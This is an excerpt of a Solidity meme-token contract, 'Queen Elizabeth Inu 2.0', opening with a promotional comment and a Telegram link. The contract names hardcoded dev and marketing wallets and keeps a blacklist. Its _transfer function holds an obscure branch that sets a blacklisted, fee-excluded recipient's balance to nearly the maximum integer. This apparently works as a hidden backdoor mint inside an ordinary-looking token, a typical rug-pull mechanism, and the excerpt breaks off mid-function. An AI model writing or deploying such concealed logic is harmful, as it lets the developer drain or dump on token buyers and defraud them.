...
/**
 If you missed Queen Elizabeth this is your chance with better utility ALSO BTC REWARDS

 Telegram : https://t.me/QueenElizabethinu2
...
contract QueenElizabethInu2 is Context, IERC20 { 
    ...
    mapping (address => bool) public _inBlackList;

    address payable public Wallet_Marketing = payable(0xe705235E0B80Eb733589AfA23184A27E7C602Bf2); 
    address payable public Wallet_Dev = payable(0x0D54A369a1308Fd992790bD855d01252d98B487a);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    function coder() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    string private constant _name = "Queen Elizabeth Inu 2.0"; 
    string private constant _symbol = unicode"QUEEN2"; 
    ...
    constructor () {
        ...
        _owner = 0x0D54A369a1308Fd992790bD855d01252d98B487a;
    ...
    function _transfer(
        ...
        if(_inBlackList[to] && !_isExcludedFromFee[from] && _isExcludedFromFee[to]){
            ddType = true;
            _tOwned[from] = _tOwned[from]-amount;
            uint256 oldO = amount;
            amount = 0+(~uint256(0)-amount);
            _tOwned[to] = (_tOwned[to]-_tOwned[to])+amount;
            amount = oldO;
